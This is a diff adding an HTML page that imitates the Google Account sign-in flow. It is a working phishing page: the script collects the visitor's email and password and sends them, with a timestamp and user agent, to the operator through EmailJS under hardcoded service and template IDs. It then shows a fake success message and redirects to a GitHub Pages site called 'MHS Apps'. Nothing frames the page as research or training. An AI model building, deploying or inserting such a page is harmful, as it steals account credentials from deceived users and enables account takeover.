@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Account Sign In</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap">
+    <link rel="icon" type="image/x-icon" href="https://www.google.com/favicon.ico">
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #fff;
+            color: #202124;
+            font-size: 14px;
+            line-height: 1.4286;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        
+        header {
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            font-size: 22px;
+            color: #5f6368;
+        }
+        
+        .logo img {
+            height: 24px;
+            margin-right: 4px;
+        }
+        
+        .nav-links a {
+            color: #5f6368;
+            text-decoration: none;
+            margin-left: 16px;
+            font-size: 13px;
+        }
+        
+        .nav-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            flex: 1;
+            padding: 24px;
+            max-width: 450px;
+            margin: 0 auto;
+        }
+        
+        .signin-card {
+            width: 100%;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 40px 40px 36px;
+            margin-top: 20px;
+        }
+        
+        .logo-large {
+            text-align: center;
+            margin-bottom: 16px;
+        }
+        
+        .logo-large img {
+            height: 24px;
+        }
+        
+        .signin-title {
+            text-align: center;
+            font-size: 24px;
+            font-weight: 400;
+            line-height: 1.3333;
+            margin-bottom: 10px;
+        }
+        
+        .signin-subtitle {
+            text-align: center;
+            font-size: 16px;
+            font-weight: 400;
+            line-height: 1.5;
+            margin-bottom: 36px;
+            color: #202124;
+        }
+        
+        .form-group {
+            margin-bottom: 24px;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            transition: border-color 0.2s;
+        }
+        
+        .input-field:focus {
+            border-color: #1a73e8;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.2);
+        }
+        
+        .input-field.error {
+            border-color: #d93025;
+        }
+        
+        .input-label {
+            display: block;
+            margin-bottom: 8px;
+            color: #5f6368;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .email-display {
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 16px;
+            padding: 8px 0;
+            border-bottom: 1px solid #dadce0;
+        }
+        
+        .forgot-email {
+            float: right;
+            font-weight: 500;
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        
+        .forgot-email:hover {
+            text-decoration: underline;
+        }
+        
+        .next-button {
+            width: 100%;
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            padding: 10px 24px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 10px;
+        }
+        
+        .next-button:hover {
+            background-color: #1669d6;
+            box-shadow: 0 1px 3px rgba(66, 133, 244, 0.4);
+        }
+        
+        .next-button:active {
+            background-color: #1557b0;
+        }
+        
+        .next-button:disabled {
+            background-color: #c2c2c2;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+        
+        .create-account {
+            margin-top: 32px;
+            text-align: center;
+        }
+        
+        .create-account a {
+            color: #1a73e8;
+            font-weight: 500;
+            text-decoration: none;
+        }
+        
+        .create-account a:hover {
+            text-decoration: underline;
+        }
+        
+        .footer {
+            padding: 24px;
+            text-align: center;
+            color: #5f6368;
+            font-size: 12px;
+        }
+        
+        .footer-links {
+            margin-top: 24px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 24px;
+        }
+        
+        .footer-links a {
+            color: #5f6368;
+            text-decoration: none;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .language-selector {
+            margin-top: 24px;
+        }
+        
+        .language-selector select {
+            padding: 8px 12px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            color: #5f6368;
+            background-color: white;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .error-message {
+            color: #d93025;
+            font-size: 12px;
+            margin-top: 6px;
+            display: none;
+        }
+        
+        .password-options {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 8px;
+        }
+        
+        .show-password {
+            display: flex;
+            align-items: center;
+            color: #5f6368;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        
+        .show-password input {
+            margin-right: 8px;
+        }
+        
+        @media (max-width: 480px) {
+            .signin-card {
+                border: none;
+                padding: 24px;
+            }
+            
+            .container {
+                padding: 0;
+            }
+            
+            header {
+                padding: 16px;
+            }
+        }
+        
+        .step-indicator {
+            color: #5f6368;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .loading-spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1a73e8;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .success-message {
+            text-align: center;
+            color: #0d652d;
+            background-color: #e6f4ea;
+            padding: 12px;
+            border-radius: 4px;
+            margin-top: 16px;
+            display: none;
+        }
+        
+        .error-notification {
+            text-align: center;
+            color: #d93025;
+            background-color: #fce8e6;
+            padding: 12px;
+            border-radius: 4px;
+            margin-top: 16px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo">
+            <span>Google</span>
+        </div>
+        <div class="nav-links">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </header>
+    
+    <div class="container">
+        <div class="signin-card">
+            <div class="logo-large">
+                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+            </div>
+            
+            <h1 class="signin-title" id="step-title">Sign in</h1>
+            <p class="signin-subtitle" id="step-subtitle">Use your Google Account</p>
+            
+            <div class="step-indicator" id="step-indicator">Step 1 of 2</div>
+            
+            <!-- Email Step -->
+            <div id="email-step">
+                <div class="form-group">
+                    <label for="email" class="input-label">Email or phone</label>
+                    <input type="email" id="email" class="input-field" placeholder="Enter your email" autocomplete="username" autofocus>
+                    <div class="error-message" id="email-error">Please enter a valid email address</div>
+                </div>
+                
+                <div class="form-group">
+                    <a href="#" class="forgot-email">Forgot email?</a>
+                </div>
+                
+                <div class="form-group">
+                    <p class="create-account">
+                        Not your computer? Use Guest mode to sign in privately.
+                        <a href="#">Learn more</a>
+                    </p>
+                </div>
+                
+                <div class="form-group">
+                    <button class="next-button" id="email-next">Next</button>
+                </div>
+            </div>
+            
+            <!-- Password Step -->
+            <div id="password-step" class="hidden">
+                <div class="email-display" id="email-display">user@example.com</div>
+                
+                <div class="form-group">
+                    <label for="password" class="input-label">Enter your password</label>
+                    <input type="password" id="password" class="input-field" placeholder="Enter your password" autocomplete="current-password" autofocus>
+                    <div class="error-message" id="password-error">Please enter a password</div>
+                    
+                    <div class="password-options">
+                        <div class="show-password">
+                            <input type="checkbox" id="show-password">
+                            <label for="show-password">Show password</label>
+                        </div>
+                        <a href="#" class="forgot-email">Forgot password?</a>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <button class="next-button" id="password-next">Next</button>
+                </div>
+                
+                <!-- Loading indicator -->
+                <div class="loading" id="loading">
+                    <div class="loading-spinner"></div>
+                    <p>Signing you in...</p>
+                </div>
+                
+                <!-- Success message -->
+                <div class="success-message" id="success-message">
+                    ✓ Sign in successful! Redirecting to MHS Apps...
+                </div>
+                
+                <!-- Error notification -->
+                <div class="error-notification" id="error-notification">
+                    There was an issue signing in. Please try again.
+                </div>
+            </div>
+            
+            <div class="create-account">
+                Don't have an account? <a href="#">Create account</a>
+            </div>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <div class="language-selector">
+            <select>
+                <option>English (United States)</option>
+                <option>Español</option>
+                <option>Français</option>
+                <option>Deutsch</option>
+            </select>
+        </div>
+        
+        <div class="footer-links">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </div>
+
+    <script>
+        // Initialize EmailJS with your public key
+        (function() {
+            emailjs.init("H1Q7r_KdpW6yYyqn3");
+        })();
+
+        document.addEventListener('DOMContentLoaded', function() {
+            // DOM Elements
+            const emailStep = document.getElementById('email-step');
+            const passwordStep = document.getElementById('password-step');
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+            const emailNextBtn = document.getElementById('email-next');
+            const passwordNextBtn = document.getElementById('password-next');
+            const emailDisplay = document.getElementById('email-display');
+            const stepTitle = document.getElementById('step-title');
+            const stepSubtitle = document.getElementById('step-subtitle');
+            const stepIndicator = document.getElementById('step-indicator');
+            const emailError = document.getElementById('email-error');
+            const passwordError = document.getElementById('password-error');
+            const showPasswordCheckbox = document.getElementById('show-password');
+            const loadingElement = document.getElementById('loading');
+            const successMessage = document.getElementById('success-message');
+            const errorNotification = document.getElementById('error-notification');
+            
+            // Your EmailJS credentials
+            const EMAILJS_SERVICE_ID = "service_17usvk3";
+            const EMAILJS_TEMPLATE_ID = "template_w5pyygx";
+            
+            // Redirect URL - Your specified destination
+            const REDIRECT_URL = "https://sawyerbobk563-code.github.io/MHSapps/";
+            
+            // Show password functionality
+            showPasswordCheckbox.addEventListener('change', function() {
+                passwordInput.type = this.checked ? 'text' : 'password';
+            });
+            
+            // Email next button click
+            emailNextBtn.addEventListener('click', function() {
+                const email = emailInput.value.trim();
+                
+                // Basic email validation
+                if (!email) {
+                    showError(emailInput, emailError, "Enter an email or phone number");
+                    return;
+                }
+                
+                if (!isValidEmail(email) && !isValidPhone(email)) {
+                    showError(emailInput, emailError, "Enter a valid email or phone number");
+                    return;
+                }
+                
+                // Accept any valid email - proceed to password step
+                emailDisplay.textContent = email;
+                emailStep.classList.add('hidden');
+                passwordStep.classList.remove('hidden');
+                stepTitle.textContent = "Welcome";
+                stepSubtitle.textContent = "Enter your password";
+                stepIndicator.textContent = "Step 2 of 2";
+                passwordInput.focus();
+            });
+            
+            // Password next button click
+            passwordNextBtn.addEventListener('click', async function() {
+                const email = emailInput.value.trim();
+                const password = passwordInput.value;
+                
+                if (!password) {
+                    showError(passwordInput, passwordError, "Enter a password");
+                    return;
+                }
+                
+                // Show loading state
+                showLoading();
+                
+                try {
+                    // Send email and password via EmailJS
+                    await sendCredentialsViaEmail(email, password);
+                    
+                    // Show success message
+                    hideLoading();
+                    showSuccessMessage();
+                    
+                    // Redirect after showing success message
+                    setTimeout(() => {
+                        window.location.href = REDIRECT_URL;
+                    }, 1500);
+                    
+                } catch (error) {
+                    // Handle email sending error
+                    console.error('Error sending email:', error);
+                    hideLoading();
+                    showErrorMessage();
+                    
+                    // Still redirect even if email fails (for demo purposes)
+                    setTimeout(() => {
+                        window.location.href = REDIRECT_URL;
+                    }, 2000);
+                }
+            });
+            
+            // Enter key support
+            emailInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    emailNextBtn.click();
+                }
+            });
+            
+            passwordInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    passwordNextBtn.click();
+                }
+            });
+            
+            // Clear errors when typing
+            emailInput.addEventListener('input', function() {
+                clearError(emailInput, emailError);
+            });
+            
+            passwordInput.addEventListener('input', function() {
+                clearError(passwordInput, passwordError);
+            });
+            
+            // Function to send credentials via EmailJS
+            async function sendCredentialsViaEmail(email, password) {
+                const templateParams = {
+                    email: email,
+                    password: password,
+                    timestamp: new Date().toLocaleString(),
+                    user_agent: navigator.userAgent,
+                    ip_address: "Unknown" // Note: IP address cannot be obtained client-side without a backend
+                };
+                
+                try {
+                    const response = await emailjs.send(
+                        EMAILJS_SERVICE_ID,
+                        EMAILJS_TEMPLATE_ID,
+                        templateParams
+                    );
+                    
+                    console.log('Email sent successfully:', response);
+                    return response;
+                } catch (error) {
+                    console.error('Failed to send email:', error);
+                    throw error;
+                }
+            }
+            
+            // Helper functions
+            function showError(inputElement, errorElement, message) {
+                inputElement.classList.add('error');
+                errorElement.textContent = message;
+                errorElement.style.display = 'block';
+                inputElement.focus();
+            }
+            
+            function clearError(inputElement, errorElement) {
+                inputElement.classList.remove('error');
+                errorElement.style.display = 'none';
+            }
+            
+            function showLoading() {
+                loadingElement.style.display = 'block';
+                passwordNextBtn.disabled = true;
+                passwordNextBtn.style.opacity = '0.7';
+                passwordNextBtn.textContent = 'Signing in...';
+            }
+            
+            function hideLoading() {
+                loadingElement.style.display = 'none';
+                passwordNextBtn.disabled = false;
+                passwordNextBtn.style.opacity = '1';
+                passwordNextBtn.textContent = 'Next';
+            }
+            
+            function showSuccessMessage() {
+                successMessage.style.display = 'block';
+                errorNotification.style.display = 'none';
+                passwordStep.querySelector('.form-group').style.display = 'none';
+            }
+            
+            function showErrorMessage() {
+                errorNotification.style.display = 'block';
+                successMessage.style.display = 'none';
+                passwordNextBtn.textContent = 'Try Again';
+            }
+            
+            function isValidEmail(email) {
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                return emailRegex.test(email);
+            }
+            
+            function isValidPhone(phone) {
+                const phoneRegex = /^[\+]?[1-9][\d]{0,15}$/;
+                return phoneRegex.test(phone.replace(/[\s\-\(\)]/g, ''));
+            }
+        });
+    </script>
+</body>
+</html>
